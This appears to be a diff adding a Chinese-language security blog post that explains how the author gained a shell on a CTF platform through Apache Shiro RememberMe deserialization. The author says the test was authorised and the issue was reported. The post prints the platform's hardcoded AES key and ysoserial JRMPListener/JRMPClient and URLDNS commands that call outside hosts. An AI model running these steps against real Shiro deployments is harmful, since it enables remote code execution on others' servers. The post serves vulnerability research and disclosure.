@@ -1,0 +1,298 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+
+    
+      <meta name="description" content="打 CTF 打膩覺得沒啥新鮮感嗎，來試試打掉整個 CTF 計分板吧! 前幾個月，剛好看到某個大型 CTF 比賽開放註冊，但不允許台灣參加有點難過 :( 看著官網最下面發現是 FlappyPig 所主辦，又附上 GitHub 原始碼 秉持著練習 Java code review 的精神就 git clone 下來找洞了!   (以下測試皆在 FlappyPig 的允許下友情測試，漏洞回報官方後也經過">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwn a CTF Platform with Java JRMP Gadget">
+<meta property="og:url" content="https://blog.orange.tw/posts/2018-03-pwn-ctf-platform-with-java-jrmp-gadget/index.html">
+<meta property="og:site_name" content="Orange Tsai">
+<meta property="og:description" content="打 CTF 打膩覺得沒啥新鮮感嗎，來試試打掉整個 CTF 計分板吧! 前幾個月，剛好看到某個大型 CTF 比賽開放註冊，但不允許台灣參加有點難過 :( 看著官網最下面發現是 FlappyPig 所主辦，又附上 GitHub 原始碼 秉持著練習 Java code review 的精神就 git clone 下來找洞了!   (以下測試皆在 FlappyPig 的允許下友情測試，漏洞回報官方後也經過">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog.orange.tw/posts/2018-03-pwn-ctf-platform-with-java-jrmp-gadget/855e69324ed7b7e5-01.png">
+<meta property="article:published_time" content="2018-03-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-09-03T06:29:19.295Z">
+<meta property="article:author" content="Orange Tsai">
+<meta property="article:tag" content="Hacker, Security, Vulnerability, Web, RCE, SSRF, XSS, CVE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.orange.tw/posts/2018-03-pwn-ctf-platform-with-java-jrmp-gadget/855e69324ed7b7e5-01.png">
+    
+
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    
+      <title>Pwn a CTF Platform with Java JRMP Gadget | Orange Tsai</title>
+    
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-13047966-1"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'UA-13047966-1');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="Orange Tsai" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+    <div class="content index py4 ">
+        
+          <header id="header">
+  
+  
+    
+      <img id="logo" alt class="u-logo" src="/images/logo.png" />
+    
+  
+    <div id="title">
+      <a class="u-url u-uid" href="/"> <h1 class="p-name">Orange Tsai</h1> </a>
+    </div>
+  
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-2x"></i></a>
+      </li>
+      <!--
+     --><li><a href="/">Home</a></li><!--
+   --><!--
+     --><li><a href="/articles/">Articles</a></li><!--
+   --><!--
+     --><li><a href="/talks/">Talks</a></li><!--
+   --><!--
+     --><li><a href="/about/">About</a></li><!--
+   -->
+    </ul>
+  </div>
+</header>
+
+        
+
+        
+          <hr style='margin: 0px; margin-bottom: 32px; border: 0.5px solid #ccc; '>
+        
+
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Pwn a CTF Platform with Java JRMP Gadget
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">🍊 <a href='/about'>Orange Tsai</a></span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-03-25T16:00:00.000Z" class="dt-published" itemprop="datePublished">2018-03-26</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>打 CTF 打膩覺得沒啥新鮮感嗎，來試試打掉整個 CTF 計分板吧! 前幾個月，剛好看到某個大型 CTF 比賽開放註冊，但不允許台灣參加有點難過 :(</p>
+<p>看著官網最下面發現是 FlappyPig 所主辦，又附上 <a target="_blank" rel="noopener" href="https://github.com/zjlywjh001/PhrackCTF-Platform-Team">GitHub 原始碼</a> 秉持著練習 Java code review 的精神就 git clone 下來找洞了!  </p>
+<p><em>(以下測試皆在 FlappyPig 的允許下友情測試，漏洞回報官方後也經過同意發文)</em></p>
+<p>在有原始碼的狀況下進行 Java 的 code review 第一件事當然是去了解第三方 Libraries 的相依性，關於 Java 的生態系我也在<a href="http://blog.orange.tw/2016/12/java-web.html">幾年前的文章</a>小小分享過，當有個底層函式庫出現問題時是整個上層的應用皆受影響!</p>
+<p>從 <code>pom.xml</code> 觀察發現用了</p>
+<ol>
+<li>Spring Framework 4.2.4<ul>
+<li>從版本來看似乎很棒沒什麼重大問題</li>
+</ul>
+</li>
+<li>Mybatis 3.3.1<ul>
+<li>一個 Java ORM</li>
+<li>似乎也沒看到用法有問題</li>
+</ul>
+</li>
+<li>Jackson 2.7.1<ul>
+<li>出過反序列化漏洞</li>
+<li>不過 <code>enableDefaultTyping</code> 沒啟用，也無直接收取 JSON 輸入無法觸發漏洞</li>
+</ul>
+</li>
+<li>Apache Shiro 1.2.4<ul>
+<li><a target="_blank" rel="noopener" href="http://blog.knownsec.com/2016/08/apache-shiro-java/">【漏洞分析】Shiro RememberMe 1.2.4反序列化導致的命令執行漏洞</a></li>
+<li>hmmm, 真好連版本都是對的，不過當然沒有這麼簡單XD</li>
+</ul>
+</li>
+</ol>
+<p>既然有現成的洞，當下即開始針對 Shiro 進行研究，首先遇到的第一個問題是照著文章內 PoC 的方式解密會發現失敗，看來是有自己修改過的怎麼辦QQ 不過翻著翻著原始碼在 <code>src/main/resources/spring-shiro.xml</code> 看到  </p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- rememberMe管理器 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;rememberMeManager&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.apache.shiro.web.mgt.CookieRememberMeManager&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- rememberMe cookie加密的密钥 建议每个项目都不一样 默认AES算法 密钥长度（128 256 512 位）--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cipherKey&quot;</span></span></span><br><span class="line"><span class="tag">              <span class="attr">value</span>=<span class="string">&quot;#&#123;T(org.apache.shiro.codec.Base64).decode(&#x27;cGhyYWNrY3RmREUhfiMkZA==&#x27;)&#125;&quot;</span>/&gt;</span></span><br><span class="line">              <span class="comment">&lt;!-- Cookie加密密钥：phrackctfDE!~#$d --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;cookie&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;rememberMeCookie&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>真開心XD 把 AES Key 更正後解回來的東西有 <code>AC ED</code> 開頭看起來是序列化過後的資料，真棒</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ python decrypt.py cGhyYWNrY3RmREUhfiMkZA== | xxd </span><br><span class="line">00000000: 9373 1385 4bb7 526f 7a97 f7c5 1e17 0da3  .s..K.Roz.......</span><br><span class="line">00000010: aced 0005 7372 0032 6f72 672e 6170 6163  ....sr.2org.apac</span><br><span class="line">00000020: 6865 2e73 6869 726f 2e73 7562 6a65 6374  he.shiro.subject</span><br><span class="line">00000030: 2e53 696d 706c 6550 7269 6e63 6970 616c  .SimplePrincipal</span><br><span class="line">00000040: 436f 6c6c 6563 7469 6f6e a87f 5825 c6a3  Collection..X%..</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>接著就是產 Gadget 丟到遠端伺服器拿 shell，但在這步怎麼也無法成功利用，有點殘念只好再繼續研究下去!  </p>
+<p>當時的猜想是:</p>
+<blockquote>
+<p>Apache Shiro 是一套實現身分驗證的 Library，而實現的方式可能有定義自己的 ClassLoader 因此導致現有的 Gadget 無法使用</p>
+</blockquote>
+<p><em>(尚無查證，不過在拿到 shell 後看到這篇文章 <a target="_blank" rel="noopener" href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html">Exploiting JVM deserialization vulns despite a broken class loader</a> 證明猜想也許是對的，不過這篇也沒實現 RCE XD)雖然無法跳至 Common Collection 但至少還有 JRE 本身的 Gadget 可以跳去做二次利用!</em> </p>
+<p>綜觀 <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a> 除了 JRE 本身的洞外可利用的 Gadget 所剩無幾，先來試試 <code>URLDNS</code> 至少先確認漏洞存在再說!</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://mydnsserver.orange.tw/ | python exp.py</span><br></pre></td></tr></table></figure>
+
+<p>發現 DNS 有回顯至少確認漏洞存在了，再繼續往下利用!下一步我選的 Gadget 則是 <code>JRMPClient</code>，由於 JRMP 是位於 RMI 底下的一層實作，所以走的也是反序列化的協議，”純猜測” 也許在這裡使用 ClassLoader 就不會是 Apache Shiro 而是原本的 ClassLoader  </p>
+<p><em>(未查證，如有人可以幫忙查證請告訴我結果XD)</em></p>
+<p>但這裡又遇到一個問題是，如何實現一個 JRMP Server 去接送過來的 Protocol?  </p>
+<p>網路上並沒有人有提供 <code>JRMPClient</code> 要如何使用的教學及利用方式!本來想要手刻但找著找著資料找回 ysoserial 上的 <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/exploit/JRMPListener.java">JRMPListener.java</a>，讀了一下原始碼才驚覺 ysoserial 真棒，各種模組化及利用都幫你寫好了! ysoserial 分為兩個大部分，<code>payload</code> 以及 <code>exploit</code>，平常都只有用到產 payload 的部分而已，但實際上作者有寫好幾份可直接利用的 exploit 並模組化，讓我們可以直接利用!</p>
+<p>所以最後的利用則是:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ java -<span class="built_in">cp</span> ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 <span class="string">&#x27;curl orange.tw&#x27;</span></span><br><span class="line"><span class="comment"># listen 一個 RMI server 走 JRMP 協議在 12345 port 上</span></span><br><span class="line"></span><br><span class="line">$ java -jar ysoserial-master-SNAPSHOT.jar JRMPClient <span class="string">&#x27;1.2.3.4:12345&#x27;</span>  | python exp.py</span><br><span class="line"><span class="comment"># 使用 JRMPClient 去連接剛剛 listen 的 server</span></span><br></pre></td></tr></table></figure>
+<p>如此一來就可以獲得 shell 惹!  </p>
+<p><img src="/posts/2018-03-pwn-ctf-platform-with-java-jrmp-gadget/855e69324ed7b7e5-01.png">  </p>
+<h1 id="Updates"><a href="#Updates" class="headerlink" title="Updates"></a>Updates</h1><ul>
+<li>2018&#x2F;03&#x2F;27 01:23, Update<ol>
+<li>經過比較詳細的分析，一開始失敗的詳細原因真是如同<a target="_blank" rel="noopener" href="https://bling.kapsi.fi/blog/jvm-deserialization-broken-classldr.html">文章</a> 所說 Shiro 自己實現了一個 Buggy 的 ClassLoader</li>
+<li>所以 payload 當中出現 <code>ChainedTransformer</code> 或是 <code>InvokerTransformer</code> 都會出現 <code>Unable to deserialize argument byte array</code> 錯誤</li>
+<li>而內建的 <code>URLDNS</code> 及 <code>JRMPClient</code> 剛好沒用到上述方式實現 Gadget 所以可以使用!</li>
+<li>所以理論上透過 RMI 或是 JDNI 的方式應該也可以成功!</li>
+</ol>
+</li>
+<li>2018&#x2F;03&#x2F;27 10:09, Update<ol>
+<li><a href="http://blog.orange.tw/2018/03/pwn-ctf-platform-with-java-jrmp-gadget.html?showComment=1522113813029#c8534491035376047625">留言</a>中有人給出了更詳細的 root cause! - “Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。”</li>
+<li>感謝幫忙解惑 &lt;(_ _)&gt;</li>
+</ol>
+</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2025
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
